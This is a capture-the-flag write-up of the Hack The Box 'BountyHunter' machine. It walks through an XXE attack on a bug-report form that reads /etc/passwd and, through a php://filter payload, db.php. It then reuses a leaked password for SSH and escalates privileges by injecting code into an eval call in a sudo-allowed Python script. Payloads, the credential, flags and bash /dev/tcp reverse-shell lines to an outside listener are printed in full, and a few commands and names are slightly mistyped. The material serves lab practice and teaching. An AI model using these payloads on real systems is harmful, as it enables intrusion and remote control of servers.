# BountyHunter

## Recon
The [nmap scan](../resources/bounty_hunter/nmap_scan) showed just 2 open ports - 22 and 80, and not much else about the servers.
First thing to do was check the web server.

## Web Server Recon
The site showed a basic landing page with not much on it.
A static analysis didn't show much on the landing page so we tried clicking around.

Eventually we found ourselves on a form which seemed to be for reporting bugs.

We checked the form for SQL injection but didn't find anything.
It turned out that it didn't submit anything, all it did was display the values from the form back on the page for you.

Finally a look through the page source showed something with more promise - [bountylog.js](https://github.com/finn-francis/hackthebox/blob/main/resources/bounty_hunter/bountylog.js)
```javascript

function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

Generating an XML file with javascript is a very dangerous thing to do, so we started checking for XXE vulnerabilities.

## XXE
First we had to check whether we could read local files, so we added a simple file disclosure XXE:
```javascript
    ...
    var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <bugreport>
    <title>&xxe;</title>
    <cwe>${$('#cwe').val()}</cwe>
    ...
```

This did actually render the [passwd file](https://github.com/finn-francis/hackthebox/blob/main/resources/bounty_hunter/passwd_results), which gave us a user:
```
development:x:1000:1000:Development:/home/development:/bin/bash
```

We then tried a few more files: `/etc/shadow`, `/home/development/user.txt` etc. But unfortunately nothing else showed up.

This found us at a bit of a dead end, so we took a step back and had a think about what to do next.

Whilst thinking we ran dirbuster, which ended up picking up an interesting file - `db.php`.
A little research found that `db.php` contains the database configurations.

Visiting `/db.php` of course yielded a blank page. So we tried an XXE file disclosure injection but to no avail.

We had a look through [this GitHub page](https://github.com/payloadbox/xxe-injection-payload-list), and the Access Control Bypass example caught my eye.
We ran the injection:
```javascript
    ...
    var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
    !DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
    <bugreport>
    <title>&xxe;</title>
    <cwe>${$('#cwe').val()}</cwe>
    ...
```
From what I understand, the above injection uses the php base64 encoder to bypass the standard authorization and return the base64 or the file.
It returned a base64 string: `PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=`

Converting this gave us exactly what we'd been looking for:
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

# User Level Access

Next thing to try was to SSH into the server and see if this password gave us access.
`root` and `admin` didn't have any luck, but when we tried with `developer` and used the password `m19RoAU0hP41A1sTsq6K` we ended up with a user shell.

This gave us the first flag:
```bash
cat user.txt
# => 9f5efe69c04462bd9b1264226a65445b
```

Running `ls -l` showed that the 'development' user had very limited sudo access. However this gave a good indication as to where we would be able to escalate our privilages:
```
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

It appeared that the python file would probably be the key to gaining root access (I assumed probably with some sort of eval exploit).

## Python File Static Analysis

[The python file](../resources/bounty_hunter/ticketValidator.py) contained some very simple code for validating tickets.
It loops over the tickets:
```python
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
```

It  ensures that the first line starts with `# Skytrain Inc`
```python
if i == 0:
    if not x.startswith("# Skytrain Inc"):
        return False
```

It ensures that the ticket is a markdown file:
```python
if i == 1:
    if not x.startswith("## Ticket to "):
        return False
    print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
```

Then it looks for a line matching `__Ticket Code:__` and assignes the code_line variable if it finds it.

```python
if x.startswith("__Ticket Code:__"):
    code_line = i+1
```

If it finds the code_line variable, and the current iterator matches it then it "validates" the ticket by ensuring it's in a very specific format:
`**<number with remainder of for when divided by 7>+<number>`
```python
if code_line and i == code_line:
    if not x.startswith("**"):
        return False
    ticketCode = x.replace("**", "").split("+")[0]
    if int(ticketCode) % 7 == 4:
        validationNumber = eval(x.replace("**", ""))
        if validationNumber > 100:
            return True
        else:
            return False
```

So based on this we constructed a "valid" ticket:
```markdown
# Skytrain Inc
## Ticket to Some Location
__Ticket Code:__
**123+10
```

## Exploiting eval

The key line for the exploit is:
```python
if int(ticketCode) % 7 == 4:
    validationNumber = eval(x.replace("**", ""))
```

`eval` is very dangerous and should never be used when there is the possibility of user input.

To demonstrate this we changed the `eval` line to:
```markdown
**123+10 and print('hello')
```

This printed hello to the console:
```
Please enter the path to the ticket file.
test.md
Destination: Some Location
hello
```

First thing to do was try and create a reverse shell, so we set up an ncat listener (`nc -nlvp 4444`) and ammended the 4th line of the ticket:
```
**123+10 and __import__('os').system('/bin/bash -i >& /dev/tcp/10.10.16.200/4444 0>&')
```

Surprisingly this caused a shell error - `sh: 1: Syntax error: end of file unexpected`

We added a 1 to the end:
```
**123+10 and __import__('os').system('/bin/bash -i >& /dev/tcp/10.10.16.200/4444 0>&1')
```
Which gave us a slightly different error `sh: 1: Syntax error: Bad fd number`

This has something to do with eval running as shell (or python or something, to be honest I have no idea)

Luckily I found a simple way around this by creating a simple executable file - `exploit`:
```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.16.200/4444 0>&1
```
Running `chmod +x exploit`

Then simplifying the ticket to:
```markdown
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**123+10 and __import__('os').system('./exploit')
```

We ran the script `sudo python3.8 /opt/skytrain_inc/ticketValidator.py`
And a reverse shell appeared in our ncat window with a root shell, giving us our second flag:

```bash
cat /root/root.txt
# => cb165e1963534600b0e2eeae5e64c4c0
```